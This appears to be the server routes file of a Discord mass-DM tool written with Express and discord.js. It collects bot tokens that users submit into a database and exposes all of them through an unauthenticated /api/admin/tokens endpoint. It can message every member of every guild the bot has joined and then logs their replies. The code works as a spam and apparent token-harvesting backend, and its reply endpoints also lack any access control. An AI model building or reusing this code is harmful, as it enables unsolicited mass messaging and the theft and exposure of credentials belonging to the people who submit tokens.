import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { z } from "zod";
import { 
  tokenSubmissionSchema, 
  dmMessageSchema, 
  bulkDmSchema, 
  tokenSubmissions,
  messageReplySchema 
} from "@shared/schema";
import { Client, GatewayIntentBits, Collection, Events } from "discord.js";
import { db } from "./db";
import { messageReplies } from "../shared/schema";
import { eq } from "drizzle-orm";

// Track active WebSocket connections
const clients = new Set<WebSocket>();
// Store the Discord client instance
let discordClient: Client | null = null;

export async function registerRoutes(app: Express): Promise<Server> {
  // Health check endpoint
  app.get("/api/health", (req, res) => {
    res.status(200).json({
      status: "healthy",
      timestamp: new Date().toISOString(),
      uptime: process.uptime()
    });
  });

  // Handle token submission
  app.post("/api/token", async (req, res) => {
    try {
      const validation = tokenSubmissionSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({ 
          message: "Invalid token format",
          errors: validation.error.flatten().fieldErrors 
        });
      }
      
      const { botToken, clientId } = validation.data;
      
      // Store token submission
      const submission = await storage.saveTokenSubmission({
        botToken,
        clientId: clientId || null,
        timestamp: new Date()
      });
      
      return res.status(200).json({ 
        success: true,
        message: "Token received successfully",
        id: submission.id
      });
    } catch (error) {
      console.error("Error processing token:", error);
      return res.status(500).json({ 
        message: "Failed to process token submission" 
      });
    }
  });

  // Send direct message to a user
  app.post("/api/dm/single", async (req, res) => {
    try {
      const validation = dmMessageSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({ 
          message: "Invalid message format",
          errors: validation.error.flatten().fieldErrors 
        });
      }
      
      // Use environment variable for token if available, otherwise use the one from request
      const { token: requestToken, userId, message } = validation.data;
      const token = process.env.DISCORD_BOT_TOKEN || requestToken;
      
      if (!token) {
        return res.status(400).json({
          message: "Discord bot token is required. Please provide it in the request or set the DISCORD_BOT_TOKEN environment variable."
        });
      }
      
      // Create a new Discord client
      const client = new Client({
        intents: [
          GatewayIntentBits.DirectMessages,
          GatewayIntentBits.Guilds,
          GatewayIntentBits.GuildMessages
        ]
      });
      
      try {
        // Log in to Discord
        await client.login(token);
        
        // Fetch the user and send the message
        const user = await client.users.fetch(userId);
        if (!user) {
          throw new Error(`User with ID ${userId} not found`);
        }
        
        const dmChannel = await user.createDM();
        await dmChannel.send(message);
        
        // Destroy the client after sending the message
        client.destroy();
        
        return res.status(200).json({ 
          success: true,
          message: `Message sent to user ${userId}`,
        });
      } catch (discordError: any) {
        console.error("Discord API error:", discordError);
        // Ensure client is destroyed in case of error
        client.destroy();
        
        return res.status(400).json({ 
          success: false,
          message: `Failed to send message: ${discordError.message || "Unknown error"}`,
        });
      }
    } catch (error) {
      console.error("Error sending DM:", error);
      return res.status(500).json({ 
        message: "Failed to send direct message" 
      });
    }
  });

  // Get available guild members for a bot
  app.post("/api/guild/members", async (req, res) => {
    try {
      const { token: requestToken, guildId } = req.body;
      
      // Use environment variable for token if available, otherwise use the one from request
      const token = process.env.DISCORD_BOT_TOKEN || requestToken;
      
      if (!token) {
        return res.status(400).json({ 
          message: "Discord bot token is required. Please provide it in the request or set the DISCORD_BOT_TOKEN environment variable." 
        });
      }
      
      // Create a new Discord client
      const client = new Client({
        intents: [
          GatewayIntentBits.DirectMessages,
          GatewayIntentBits.Guilds,
          GatewayIntentBits.GuildMembers,
          GatewayIntentBits.GuildMessages
        ]
      });
      
      try {
        // Log in to Discord
        await client.login(token);
        
        let members: any[] = [];
        
        if (guildId) {
          // If guildId is provided, fetch members from that specific guild
          const guild = await client.guilds.fetch(guildId);
          if (!guild) {
            client.destroy();
            return res.status(404).json({ 
              success: false,
              message: `Guild with ID ${guildId} not found` 
            });
          }
          
          // Fetch members
          await guild.members.fetch();
          
          // Extract member data
          members = guild.members.cache.map(member => ({
            id: member.id,
            username: member.user.username,
            displayName: member.displayName,
            avatarUrl: member.user.displayAvatarURL({ size: 64 }),
            guildId: guild.id,
            guildName: guild.name
          }));
        } else {
          // If no guildId is provided, fetch members from all guilds
          // Get all guilds as an array
          const guildArray = Array.from(client.guilds.cache.values());
          
          // For each guild, fetch members
          for (const guild of guildArray) {
            try {
              await guild.members.fetch();
              
              const guildMembers = guild.members.cache.map(member => ({
                id: member.id,
                username: member.user.username,
                displayName: member.displayName,
                avatarUrl: member.user.displayAvatarURL({ size: 64 }),
                guildId: guild.id,
                guildName: guild.name
              }));
              
              members = [...members, ...guildMembers];
            } catch (guildError) {
              console.error(`Error fetching members for guild ${guild.id}:`, guildError);
            }
          }
          
          // Remove duplicate members (same user in multiple servers)
          members = members.filter((member, index, self) =>
            index === self.findIndex((m) => m.id === member.id)
          );
        }
        
        // Filter out bots
        members = members.filter(member => !member.bot);
        
        // Destroy the client after fetching members
        client.destroy();
        
        return res.status(200).json({ 
          success: true,
          members
        });
      } catch (discordError: any) {
        console.error("Discord API error:", discordError);
        // Ensure client is destroyed in case of error
        client.destroy();
        
        return res.status(400).json({ 
          success: false,
          message: `Failed to fetch guild members: ${discordError.message || "Unknown error"}`,
        });
      }
    } catch (error) {
      console.error("Error fetching guild members:", error);
      return res.status(500).json({ 
        message: "Failed to fetch guild members" 
      });
    }
  });

  // Get guilds available to the bot
  app.post("/api/guilds", async (req, res) => {
    try {
      const { token: requestToken } = req.body;
      
      // Use environment variable for token if available, otherwise use the one from request
      const token = process.env.DISCORD_BOT_TOKEN || requestToken;
      
      if (!token) {
        return res.status(400).json({ 
          message: "Discord bot token is required. Please provide it in the request or set the DISCORD_BOT_TOKEN environment variable." 
        });
      }
      
      // Create a new Discord client with all necessary intents
      const client = new Client({
        intents: [
          GatewayIntentBits.Guilds,
          GatewayIntentBits.GuildMembers,
          GatewayIntentBits.GuildMessages,
          GatewayIntentBits.MessageContent
        ]
      });
      
      try {
        // Log in to Discord
        await client.login(token);
        
        // Fetch all guilds the bot is in
        const guilds = client.guilds.cache.map(guild => ({
          id: guild.id,
          name: guild.name,
          memberCount: guild.memberCount,
          iconUrl: guild.iconURL({ size: 64 })
        }));
        
        // Destroy the client after fetching guilds
        client.destroy();
        
        return res.status(200).json({ 
          success: true,
          guilds
        });
      } catch (discordError: any) {
        console.error("Discord API error:", discordError);
        // Ensure client is destroyed in case of error
        client.destroy();
        
        return res.status(400).json({ 
          success: false,
          message: `Failed to fetch guilds: ${discordError.message || "Unknown error"}`,
        });
      }
    } catch (error) {
      console.error("Error fetching guilds:", error);
      return res.status(500).json({ 
        message: "Failed to fetch guilds" 
      });
    }
  });
  
  // Send bulk DMs to multiple users
  app.post("/api/dm/bulk", async (req, res) => {
    try {
      const validation = bulkDmSchema.safeParse(req.body);
      
      if (!validation.success) {
        return res.status(400).json({ 
          message: "Invalid bulk message format",
          errors: validation.error.flatten().fieldErrors 
        });
      }
      
      const { token: requestToken, userIds, message, selectAll, delay } = validation.data;
      
      // Use environment variable for token if available, otherwise use the one from request
      const token = process.env.DISCORD_BOT_TOKEN || requestToken;
      
      if (!token) {
        return res.status(400).json({ 
          message: "Discord bot token is required. Please provide it in the request or set the DISCORD_BOT_TOKEN environment variable." 
        });
      }
      
      // Create a new Discord client
      const client = new Client({
        intents: [
          GatewayIntentBits.DirectMessages,
          GatewayIntentBits.Guilds,
          GatewayIntentBits.GuildMembers,
          GatewayIntentBits.GuildMessages,
          GatewayIntentBits.MessageContent
        ]
      });
      
      try {
        // Log in to Discord
        await client.login(token);
        
        // Track successful and failed messages
        const results = {
          success: 0,
          failed: 0,
          failedIds: [] as string[]
        };
        
        // Initialize target user IDs
        let targetUserIds = [...userIds];
        
        // If selectAll is true, fetch members from all guilds
        if (selectAll) {
          try {
            // Get all guilds as an array
            const guildArray = Array.from(client.guilds.cache.values());
            
            // Fetch members from all guilds
            for (const guild of guildArray) {
              try {
                await guild.members.fetch();
                
                // Add all guild member IDs to the target list
                guild.members.cache.forEach(member => {
                  if (!member.user.bot && !targetUserIds.includes(member.id)) {
                    targetUserIds.push(member.id);
                  }
                });
              } catch (guildError) {
                console.error(`Error fetching members for guild ${guild.id}:`, guildError);
              }
            }
          } catch (guildError) {
            console.error("Error fetching members:", guildError);
          }
        }
        
        // Send messages to each user with delay if specified
        for (const userId of targetUserIds) {
          try {
            const user = await client.users.fetch(userId);
            if (!user) {
              results.failed++;
              results.failedIds.push(userId);
              continue;
            }
            
            // Don't DM bots
            if (user.bot) {
              continue;
            }
            
            const dmChannel = await user.createDM();
            await dmChannel.send(message);
            results.success++;
            
            // Add delay between messages if specified
            if (delay && delay > 0 && userId !== targetUserIds[targetUserIds.length - 1]) {
              await new Promise(resolve => setTimeout(resolve, delay));
            }
          } catch (userError) {
            console.error(`Error sending message to user ${userId}:`, userError);
            results.failed++;
            results.failedIds.push(userId);
          }
        }
        
        // Instead of destroying the client, save it to listen for replies
        if (discordClient) {
          discordClient.destroy();
        }
        
        // Set the client to listen for replies
        discordClient = client;
        
        // Set up message event listener for DM replies
        discordClient.on(Events.MessageCreate, async (message) => {
          // Only process direct messages that are not from the bot itself
          if (message.channel.isDMBased() && !message.author.bot) {
            try {
              console.log(`Received DM reply from ${message.author.username}: ${message.content}`);
              
              // Store the reply in the database
              const reply = await storage.saveMessageReply({
                userId: message.author.id,
                username: message.author.username,
                content: message.content,
                messageId: message.id,
                timestamp: new Date(),
                avatarUrl: message.author.displayAvatarURL({ size: 64 }),
                guildId: undefined,
                guildName: undefined
              });
              
              // Broadcast the new reply to all connected WebSocket clients
              const messageToSend = JSON.stringify({
                type: 'newReply',
                data: reply
              });
              
              clients.forEach(client => {
                if (client.readyState === WebSocket.OPEN) {
                  client.send(messageToSend);
                }
              });
            } catch (error) {
              console.error('Error processing message reply:', error);
            }
          }
        });
        
        console.log('Reply listener started after sending bulk messages');
        
        return res.status(200).json({ 
          success: true,
          message: `Sent ${results.success} messages, failed ${results.failed} messages. Reply listener is now active.`,
          sentCount: results.success,
          failedCount: results.failed,
          failedIds: results.failedIds,
          replyListenerActive: true
        });
      } catch (discordError: any) {
        console.error("Discord API error:", discordError);
        // Ensure client is destroyed in case of error
        client.destroy();
        
        return res.status(400).json({ 
          success: false,
          message: `Failed to send bulk messages: ${discordError.message || "Unknown error"}`,
        });
      }
    } catch (error) {
      console.error("Error sending bulk DMs:", error);
      return res.status(500).json({ 
        message: "Failed to send bulk messages" 
      });
    }
  });

  // Admin endpoint to view stored tokens
  app.get("/api/admin/tokens", async (req, res) => {
    try {
      // Get all tokens from the database
      const results = await db.select().from(tokenSubmissions).orderBy(tokenSubmissions.timestamp);
      
      return res.status(200).json({
        success: true,
        count: results.length,
        tokens: results
      });
    } catch (error) {
      console.error("Error fetching tokens:", error);
      return res.status(500).json({
        success: false,
        message: "Failed to fetch tokens"
      });
    }
  });

  // Get message replies
  app.get("/api/replies", async (req, res) => {
    try {
      const replies = await db.select().from(messageReplies).orderBy(messageReplies.timestamp);
      res.json(replies);
    } catch (error) {
      console.error("Error fetching replies:", error);
      res.status(500).json({ error: "Failed to fetch replies" });
    }
  });

  // Send a reply
  app.post("/api/replies", async (req, res) => {
    try {
      const { userId, username, content, messageId, avatarUrl, guildId, guildName } = req.body;
      
      const reply = await db.insert(messageReplies).values({
        userId,
        username,
        content,
        messageId,
        timestamp: new Date(),
        avatarUrl,
        guildId,
        guildName
      }).returning();

      // Broadcast the new reply to all WebSocket clients
      const broadcastMessage = JSON.stringify({
        type: 'newReply',
        data: reply[0]
      });

      clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(broadcastMessage);
        }
      });

      res.json(reply[0]);
    } catch (error) {
      console.error("Error sending reply:", error);
      res.status(500).json({ error: "Failed to send reply" });
    }
  });

  // Setup WebSocket server for real-time events
  const httpServer = createServer(app);
  const wss = new WebSocketServer({ server: httpServer });

  wss.on('connection', (ws) => {
    console.log('New WebSocket connection');
    clients.add(ws);

    // Send initial data to the new client
    db.select().from(messageReplies).orderBy(messageReplies.timestamp)
      .then(replies => {
        const initialData = JSON.stringify({
          type: 'initialReplies',
          data: replies
        });
        ws.send(initialData);
      })
      .catch(error => {
        console.error('Error sending initial data:', error);
      });

    ws.on('message', async (message) => {
      try {
        const data = JSON.parse(message.toString());
        console.log('Received WebSocket message:', data);
        
        if (data.type === 'reply') {
          // Handle message reply
          const { userId, username, content, messageId, avatarUrl, guildId, guildName } = data;
          
          console.log('Processing reply:', { userId, username, content, messageId });
          
          // Store reply in database
          const reply = await db.insert(messageReplies).values({
            userId,
            username,
            content,
            messageId,
            timestamp: new Date(),
            avatarUrl,
            guildId,
            guildName
          }).returning();

          console.log('Stored reply:', reply[0]);

          // Broadcast reply to all connected clients
          const broadcastMessage = JSON.stringify({
            type: 'newReply',
            data: reply[0]
          });

          console.log('Broadcasting reply to clients');
          clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
              client.send(broadcastMessage);
            }
          });
        }
      } catch (error) {
        console.error('Error handling WebSocket message:', error);
      }
    });

    ws.on('close', () => {
      console.log('Client disconnected');
      clients.delete(ws);
    });

    ws.on('error', (error) => {
      console.error('WebSocket error:', error);
      clients.delete(ws);
    });
  });

  // Setup persistent Discord client to listen for message replies
  app.post("/api/startReplyListener", async (req, res) => {
    try {
      const { token } = req.body;
      
      if (!token) {
        return res.status(400).json({
          success: false,
          message: "Bot token is required"
        });
      }
      
      // If a client is already running, destroy it
      if (discordClient) {
        discordClient.destroy();
        discordClient = null;
      }
      
      // Create a new Discord client
      discordClient = new Client({
        intents: [
          GatewayIntentBits.DirectMessages,
          GatewayIntentBits.Guilds,
          GatewayIntentBits.GuildMembers,
          GatewayIntentBits.GuildMessages,
          GatewayIntentBits.MessageContent
        ]
      });
      
      // Listen for direct messages
      discordClient.on(Events.MessageCreate, async (message) => {
        // Only process direct messages that are not from the bot itself
        if (message.channel.isDMBased() && !message.author.bot) {
          try {
            console.log(`Received DM reply from ${message.author.username}: ${message.content}`);
            
            // Store the reply in the database
            const reply = await storage.saveMessageReply({
              userId: message.author.id,
              username: message.author.username,
              content: message.content,
              messageId: message.id,
              timestamp: new Date(),
              avatarUrl: message.author.displayAvatarURL({ size: 64 }),
              guildId: undefined,
              guildName: undefined
            });
            
            // Broadcast the new reply to all connected WebSocket clients
            const messageToSend = JSON.stringify({
              type: 'newReply',
              data: reply
            });
            
            clients.forEach(client => {
              if (client.readyState === WebSocket.OPEN) {
                client.send(messageToSend);
              }
            });
          } catch (error) {
            console.error('Error processing message reply:', error);
          }
        }
      });
      
      // Login to Discord
      await discordClient.login(token);
      
      return res.status(200).json({
        success: true,
        message: "Reply listener started successfully"
      });
    } catch (error) {
      console.error("Error starting reply listener:", error);
      return res.status(500).json({
        success: false,
        message: "Failed to start reply listener"
      });
    }
  });

  return httpServer;
}
